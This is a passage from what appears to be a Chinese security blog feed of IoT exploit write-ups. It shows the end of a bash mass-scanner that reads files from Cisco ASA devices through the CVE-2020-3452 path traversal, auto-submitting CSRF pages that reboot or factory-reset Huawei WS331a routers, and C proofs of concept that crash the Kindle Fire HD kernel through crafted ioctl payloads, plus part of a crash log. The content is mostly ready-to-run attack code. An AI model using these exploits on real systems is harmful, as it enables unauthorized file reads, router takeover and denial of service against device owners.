class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$0</span> -l targets.txt -r %2bCSCOE%2b/portal_inc.lua &quot;</span></span><br><span class="line">   <span class="built_in">echo</span> -e <span class="string">&quot;\t-l for list of IPs in text file&quot;</span></span><br><span class="line">   <span class="built_in">echo</span> -e <span class="string">&quot;\t-r file to read, default: %2bCSCOE%2b/portal_inc.lua&quot;</span></span><br><span class="line">   <span class="built_in">echo</span> -e <span class="string">&quot;\t-i for single IP test&quot;</span></span><br><span class="line">   <span class="built_in">exit</span> 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">getopts</span> <span class="string">&quot;l:r:i:&quot;</span> opt</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">   <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$opt</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">      l ) input=<span class="string">&quot;<span class="variable">$OPTARG</span>&quot;</span> ;;</span><br><span class="line">      r ) <span class="built_in">read</span>=<span class="string">&quot;<span class="variable">$OPTARG</span>&quot;</span> ;;</span><br><span class="line">      i ) website=<span class="string">&quot;<span class="variable">$OPTARG</span>&quot;</span> ;;</span><br><span class="line">      ? ) helpFunction ;;</span><br><span class="line">   <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#if $website is empty or $input is empty</span></span><br><span class="line"><span class="keyword">if</span> [  -z <span class="string">&quot;<span class="variable">$website</span>&quot;</span>  ] &amp;&amp; [ -z <span class="string">&quot;<span class="variable">$input</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;Some/all of the parameters are empty&quot;</span>;</span><br><span class="line">   helpFunction</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#usage</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$website</span>&quot;</span>];</span><br><span class="line">  <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">while</span> IFS= <span class="built_in">read</span> -r line</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    name=$(<span class="built_in">echo</span> <span class="variable">$line</span> | cut -c9-19)</span><br><span class="line">    <span class="comment">#echo &quot;testing $line&quot;</span></span><br><span class="line">    filename=<span class="string">&quot;<span class="variable">$name</span>.txt&quot;</span></span><br><span class="line">      <span class="comment">#echo $response</span></span><br><span class="line">      status=$(curl -LI  <span class="variable">$line</span><span class="string">&quot;/+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=..&amp;resource-type=..&amp;name=&quot;</span><span class="variable">$read</span>  -o /dev/null   -w <span class="string">&#x27;%&#123;http_code&#125;\n&#x27;</span> -s)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> [ <span class="variable">$status</span> -eq <span class="string">&quot;400&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$line</span>/+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=..&amp;resource-type=..&amp;name=<span class="variable">$read</span> doesn&#x27;t exist!&quot;</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        wget  <span class="string">&quot;<span class="variable">$line</span>/+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=..&amp;resource-type=..&amp;name=<span class="variable">$read</span>&quot;</span> -O <span class="variable">$name</span>.txt</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> [ -s <span class="variable">$filename</span> ]; <span class="keyword">then</span></span><br><span class="line">          <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$line</span>/+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=..&amp;resource-type=..&amp;name=<span class="variable">$read</span> exists, reading <span class="variable">$read</span>...&quot;</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;downloaded!, <span class="variable">$line</span> is vulnerable to CVE-2020-3452.&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="built_in">echo</span> <span class="string">&quot;not vulnerable!&quot;</span></span><br><span class="line">          rm -rf <span class="variable">$filename</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span> &lt; <span class="string">&quot;<span class="variable">$input</span>&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">  name=$(<span class="built_in">echo</span> <span class="variable">$website</span> | cut -c9-16)</span><br><span class="line">  filename=<span class="string">&quot;<span class="variable">$name</span>.txt&quot;</span></span><br><span class="line"></span><br><span class="line">  status=$(curl -LI  <span class="variable">$website</span><span class="string">&quot;/+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=..&amp;resource-type=..&amp;name=&quot;</span><span class="variable">$read</span>  -o /dev/null   -w <span class="string">&#x27;%&#123;http_code&#125;\n&#x27;</span> -s)</span><br><span class="line">  <span class="keyword">if</span> [ <span class="variable">$status</span> -eq <span class="string">&quot;Bad Request&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$website</span>/+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=..&amp;resource-type=..&amp;name=<span class="variable">$read</span> doesn&#x27;t exist!&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$website</span>/+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=..&amp;resource-type=..&amp;name=<span class="variable">$read</span> exists, reading <span class="variable">$read</span>...&quot;</span></span><br><span class="line">    wget  <span class="string">&quot;<span class="variable">$website</span>/+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=..&amp;resource-type=..&amp;name=<span class="variable">$read</span>&quot;</span> -O <span class="variable">$name</span>.txt</span><br><span class="line">    <span class="keyword">if</span> [ -s <span class="variable">$filename</span> ]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;downloaded!, <span class="variable">$website</span> is vulnerable to CVE-2020-3452.&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;not vulnerable!&quot;</span></span><br><span class="line">      rm -rf <span class="variable">$filename</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">fi</span>           </span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>Cisco</tag>
      </tags>
  </entry>
  <entry>
    <title>（CVE-2016-6158）华为WS331a产品管理页面存在CSRF漏洞</title>
    <url>/2020/09/12/IOT/Exploit/Huawei/%EF%BC%88CVE-2016-6158%EF%BC%89%E5%8D%8E%E4%B8%BAWS331a%E4%BA%A7%E5%93%81%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>HuaweiWS331a是中国华为（Huawei）公司的一款迷你无线路由器。使用WS331a-10V100R001C01B112之前版本软件的HuaweiWS331a路由器的管理界面存在跨站请求伪造漏洞。远程攻击者可通过提交特制的请求利用该漏洞恢复出厂设置或重启设备。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>WS331a-10 V100R001C02B017SP01及之前版本</p>
<a id="more"></a>

<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="POC实现代码如下："><a href="#POC实现代码如下：" class="headerlink" title="POC实现代码如下："></a>POC实现代码如下：</h3><blockquote>
<p>当管理员登陆后，打开如下poc页面，WS331a设备将重启。</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.3.1/api/service/reboot.cgi&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> <span class="built_in">document</span>.forms[<span class="number">0</span>].submit(); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>当管理员登陆后，打开如下poc页面，WS331a设备将恢复初始化配置。设备自动重启后不需要密码即可连接热点，并使用amdin/admin对设备进行管理控制。</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.3.1/api/service/restoredefcfg.cgi&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> <span class="built_in">document</span>.forms[<span class="number">0</span>].submit(); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>Huawei</tag>
      </tags>
  </entry>
  <entry>
    <title>（CVE-2018-11021）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞</title>
    <url>/2020/09/12/IOT/Exploit/Amazon%20Kindle%20Fire%20HD(3rd)/%EF%BC%88CVE-2018-11021%EF%BC%89Amazon-Kindle-Fire-HD-3rd-Fire-OS-kernel%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><blockquote>
<p>Amazon Kindle Fire HD（3rd）Fire OS 4.5.5.3内核组件中的内核模块/omap/drivers/video/omap2/dsscomp/device.c允许攻击者通过设备/ dev上ioctl的参数注入特制参数/ dsscomp与命令<strong>1118064517</strong>并导致内核崩溃。</p>
<p>要探索此漏洞，必须打开设备文件/ dev / dsscomp，并使用命令<strong>1118064517</strong>和精心设计的有效负载作为第三个参数在此设备文件上调用ioctl系统调用。</p>
</blockquote>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Fire OS 4.5.5.3</p>
<a id="more"></a>

<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>poc</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is poc of Kindle Fire HD 3rd</span></span><br><span class="line"><span class="comment"> * A bug in the ioctl interface of device file /dev/dsscomp causes the system crash via IOCTL 1118064517.</span></span><br><span class="line"><span class="comment"> * Related buggy struct name is dsscomp_setup_dispc_data.</span></span><br><span class="line"><span class="comment"> * This Poc should run with permission to do ioctl on /dev/dsscomp.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">char</span> *driver = <span class="string">&quot;/dev/dsscomp&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> command = <span class="number">1118064517</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **env)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> payload[] = &#123;</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x00000003</span>,</span><br><span class="line">    <span class="number">0x5d200040</span>,</span><br><span class="line">    <span class="number">0x79900008</span>,</span><br><span class="line">    <span class="number">0x8f5928bd</span>,</span><br><span class="line">    <span class="number">0x78b02422</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0xf4c50400</span>,</span><br><span class="line">    <span class="number">0x007fffff</span>,</span><br><span class="line">    <span class="number">0x8499f562</span>,</span><br><span class="line">    <span class="number">0xffff0400</span>,</span><br><span class="line">    <span class="number">0x001b131d</span>,</span><br><span class="line">    <span class="number">0x60818210</span>,</span><br><span class="line">    <span class="number">0x00000007</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x9da9041c</span>,</span><br><span class="line">    <span class="number">0xcd980400</span>,</span><br><span class="line">    <span class="number">0x001f03f4</span>,</span><br><span class="line">    <span class="number">0x00000007</span>,</span><br><span class="line">    <span class="number">0x2a34003f</span>,</span><br><span class="line">    <span class="number">0x7c80d8f3</span>,</span><br><span class="line">    <span class="number">0x63102627</span>,</span><br><span class="line">    <span class="number">0xc73643a8</span>,</span><br><span class="line">    <span class="number">0xa28f0665</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x689e57b4</span>,</span><br><span class="line">    <span class="number">0x01ff0008</span>,</span><br><span class="line">    <span class="number">0x5e7324b1</span>,</span><br><span class="line">    <span class="number">0xae3b003f</span>,</span><br><span class="line">    <span class="number">0x0b174d86</span>,</span><br><span class="line">    <span class="number">0x00000400</span>,</span><br><span class="line">    <span class="number">0x21ffff37</span>,</span><br><span class="line">    <span class="number">0xceb367a4</span>,</span><br><span class="line">    <span class="number">0x00000040</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0xec000f9e</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x000001ff</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x0000000f</span>,</span><br><span class="line">    <span class="number">0x0425c069</span>,</span><br><span class="line">    <span class="number">0x038cc3be</span>,</span><br><span class="line">    <span class="number">0x0000000f</span>,</span><br><span class="line">    <span class="number">0x00000080</span>,</span><br><span class="line">    <span class="number">0xe5790100</span>,</span><br><span class="line">    <span class="number">0x5b1bffff</span>,</span><br><span class="line">    <span class="number">0x0000d355</span>,</span><br><span class="line">    <span class="number">0x0000c685</span>,</span><br><span class="line">    <span class="number">0xa0070000</span>,</span><br><span class="line">    <span class="number">0x0010ffff</span>,</span><br><span class="line">    <span class="number">0x00a0ff00</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0xff490700</span>,</span><br><span class="line">    <span class="number">0x0832ad03</span>,</span><br><span class="line">    <span class="number">0x00000006</span>,</span><br><span class="line">    <span class="number">0x00000002</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x81f871c0</span>,</span><br><span class="line">    <span class="number">0x738019cb</span>,</span><br><span class="line">    <span class="number">0xbf47ffff</span>,</span><br><span class="line">    <span class="number">0x00000040</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x7f190f33</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x8295769b</span>,</span><br><span class="line">    <span class="number">0x0000003f</span>,</span><br><span class="line">    <span class="number">0x869f2295</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0xd673914f</span>,</span><br><span class="line">    <span class="number">0x05055800</span>,</span><br><span class="line">    <span class="number">0xed69b7d5</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x0107ebbd</span>,</span><br><span class="line">    <span class="number">0xd214af8d</span>,</span><br><span class="line">    <span class="number">0xffff4a93</span>,</span><br><span class="line">    <span class="number">0x26450008</span>,</span><br><span class="line">    <span class="number">0x58df0000</span>,</span><br><span class="line">    <span class="number">0xd16db084</span>,</span><br><span class="line">    <span class="number">0x03ff30dd</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x209aff3b</span>,</span><br><span class="line">    <span class="number">0xe7850800</span>,</span><br><span class="line">    <span class="number">0x00000002</span>,</span><br><span class="line">    <span class="number">0x30da815c</span>,</span><br><span class="line">    <span class="number">0x426f5105</span>,</span><br><span class="line">    <span class="number">0x0de109d7</span>,</span><br><span class="line">    <span class="number">0x2c1a65fc</span>,</span><br><span class="line">    <span class="number">0xfcb3d75f</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x8066be5b</span>,</span><br><span class="line">    <span class="number">0x00000002</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x5cf232ec</span>,</span><br><span class="line">    <span class="number">0x680d1469</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x00000020</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x00000400</span>,</span><br><span class="line">    <span class="number">0xd1d12be8</span>,</span><br><span class="line">    <span class="number">0x02010200</span>,</span><br><span class="line">    <span class="number">0x01ffc16f</span>,</span><br><span class="line">    <span class="number">0xf6e237e6</span>,</span><br><span class="line">    <span class="number">0x007f0000</span>,</span><br><span class="line">    <span class="number">0x01ff08f8</span>,</span><br><span class="line">    <span class="number">0x000f00f9</span>,</span><br><span class="line">    <span class="number">0xbad07695</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0xbaff0000</span>,</span><br><span class="line">    <span class="number">0x24040040</span>,</span><br><span class="line">    <span class="number">0x00000006</span>,</span><br><span class="line">    <span class="number">0x00000004</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0xbc2e9242</span>,</span><br><span class="line">    <span class="number">0x009f5f08</span>,</span><br><span class="line">    <span class="number">0x00800000</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0xff8800ff</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x000003f4</span>,</span><br><span class="line">    <span class="number">0x6faa8472</span>,</span><br><span class="line">    <span class="number">0x00000400</span>,</span><br><span class="line">    <span class="number">0xec857dd5</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000040</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x3f004874</span>,</span><br><span class="line">    <span class="number">0x0000b77a</span>,</span><br><span class="line">    <span class="number">0xec9acb95</span>,</span><br><span class="line">    <span class="number">0xfacc0001</span>,</span><br><span class="line">    <span class="number">0xffff0001</span>,</span><br><span class="line">    <span class="number">0x0080ffff</span>,</span><br><span class="line">    <span class="number">0x3600ff03</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x8fff7d7f</span>,</span><br><span class="line">    <span class="number">0x6b87075a</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x001001ff</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0xff1f0512</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x51e32167</span>,</span><br><span class="line">    <span class="number">0xc18c55cc</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0xb4aaf12b</span>,</span><br><span class="line">    <span class="number">0x86edfdbd</span>,</span><br><span class="line">    <span class="number">0x00000010</span>,</span><br><span class="line">    <span class="number">0x0000003f</span>,</span><br><span class="line">    <span class="number">0xabff7b00</span>,</span><br><span class="line">    <span class="number">0xffff9ea3</span>,</span><br><span class="line">    <span class="number">0xb28e0040</span>,</span><br><span class="line">    <span class="number">0x000fffff</span>,</span><br><span class="line">    <span class="number">0x458603f4</span>,</span><br><span class="line">    <span class="number">0xffff007f</span>,</span><br><span class="line">    <span class="number">0xa9030f02</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x002cffff</span>,</span><br><span class="line">    <span class="number">0x9e00cdff</span>,</span><br><span class="line">    <span class="number">0x00000004</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span> &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd = <span class="number">0</span>;</span><br><span class="line">        fd = open(driver, O_RDWR);</span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed to open %s, with errno %d\n&quot;</span>, driver, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 1 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Try open %s with command 0x%x.\n&quot;</span>, driver, command);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;System will crash and reboot.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(ioctl(fd, command, &amp;payload) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Allocation of structs failed, %d\n&quot;</span>, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 2 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="崩溃日志"><a href="#崩溃日志" class="headerlink" title="崩溃日志"></a>崩溃日志</h2><blockquote>
<p>To be added here.</p>
</blockquote>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>Amazon</tag>
      </tags>
  </entry>
  <entry>
    <title>（CVE-2018-11023）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞</title>
    <url>/2020/09/12/IOT/Exploit/Amazon%20Kindle%20Fire%20HD(3rd)/%EF%BC%88CVE-2018-11023%EF%BC%89Amazon-Kindle-Fire-HD-3rd-Fire-OS-kernel%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><hr>
<blockquote>
<p>Amazon Kindle Fire HD（3rd）Fire OS 4.5.5.3的内核组件中的内核模块/omap/drivers/misc/gcx/gcioctl/gcif.c允许攻击者通过设备/ dev上ioctl的参数注入特制参数/ gcioctl使用命令3222560159，并导致内核崩溃。</p>
</blockquote>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Fire OS 4.5.5.3</p>
<a id="more"></a>

<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>poc：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is poc of Kindle Fire HD 3rd</span></span><br><span class="line"><span class="comment"> * A bug in the ioctl interface of device file /dev/gcioctl causes the system crash via IOCTL 3222560159. </span></span><br><span class="line"><span class="comment"> * This Poc should run with permission to do ioctl on /dev/gcioctl.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">char</span> *driver = <span class="string">&quot;/dev/gcioctl&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> command = <span class="number">3222560159</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **env)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> payload[] = &#123; <span class="number">0x244085aa</span>, <span class="number">0x1a03e6ef</span>, <span class="number">0x000003f4</span>, <span class="number">0x00000000</span> &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        fd = open(driver, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed to open %s, with errno %d\n&quot;</span>, driver, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 1 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Try open %s with command 0x%x.\n&quot;</span>, driver, command);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;System will crash and reboot.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(ioctl(fd, command, &amp;payload) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Allocation of structs failed, %d\n&quot;</span>, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 2 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="崩溃日志"><a href="#崩溃日志" class="headerlink" title="崩溃日志"></a>崩溃日志</h2><blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[   79.825592] init: untracked pid 3232 exited</span><br><span class="line">[   79.830841] init: untracked pid 3234 exited</span><br><span class="line">[   95.970855] Alignment trap: not handling instruction e1953f9f at [&lt;c06a4d84&gt;]</span><br><span class="line">[   95.978912] Unhandled fault: alignment exception (0x001) at 0x1a03e6f3</span><br><span class="line">[   95.986053] Internal error: : 1 [#1] PREEMPT SMP ARM</span><br><span class="line">[   95.991638] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)</span><br><span class="line">[   95.999145] CPU: 0    Tainted: G           O  (3.4.83-gd2afc0bae69 #1)</span><br><span class="line">[   96.006408] PC is at __raw_spin_lock_irqsave+0x38&#x2F;0xb0</span><br><span class="line">[   96.012115] LR is at _raw_spin_lock_irqsave+0x10&#x2F;0x14</span><br><span class="line">[   96.017791] pc : [&lt;c06a4d88&gt;]    lr : [&lt;c06a4e10&gt;]    psr: 20000093</span><br><span class="line">[   96.017822] sp : d02bfdd8  ip : d02bfdf8  fp : d02bfdf4</span><br><span class="line">[   96.030578] r10: 00000000  r9 : dd3eeca8  r8 : 00000001</span><br><span class="line">[   96.036376] r7 : 1a03e6ef  r6 : 00000001  r5 : 1a03e6f3  r4 : d02be000</span><br><span class="line">[   96.043701] r3 : 00000001  r2 : 00000001  r1 : 00000082  r0 : 20000013</span><br><span class="line">[   96.050933] Flags: nzCv  IRQs off  FIQs on  Mode SVC_32  ISA ARM  Segment user</span><br><span 